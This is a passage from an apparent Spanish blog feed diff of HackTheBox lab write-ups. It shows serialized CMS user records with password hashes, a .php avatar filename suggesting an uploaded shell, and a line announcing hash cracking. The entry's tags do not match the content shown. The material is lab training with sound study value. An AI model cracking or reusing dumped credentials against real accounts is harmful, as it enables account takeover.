Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;kim-swift&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483309&quot;;s:4:&quot;name&quot;;s:9:&quot;kim-swift&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;kim@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Kim Swift&quot;;s:4:&quot;pass&quot;;s:64:&quot;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487096&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;3&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:6:&quot;egre55&quot;;a:11:{s:2:&quot;id&quot;;s:10:&quot;1598829833&quot;;s:4:&quot;name&quot;;s:6:&quot;egre55&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:15:&quot;egre55@test.com&quot;;s:4:&quot;nick&quot;;s:6:&quot;egre55&quot;;s:4:&quot;pass&quot;;s:64:&quot;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:3:&quot;lts&quot;;s:10:&quot;1598834079&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:6:&quot;avatar&quot;;s:26:&quot;avatar_egre55_spwvgujw.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483309;s:9:&quot;kim-swift&quot;;}}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora intentaremos crackear todos estos hashes&lt;/p&gt;
+</description>
+        <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Passage</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Passage</guid>
+        
+        <category>Adobe Coldfusion</category>
+        
+        <category>Directory traversal</category>
+        
+        <category>Cracking hash</category>
+        
+        <category>Schedule Tasks</category>
+        
+        <category>Create malicius JSP</category>
+        
+        <category>Abusing SeimpersonatePrivilege</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Arctic - htb writeup</title>
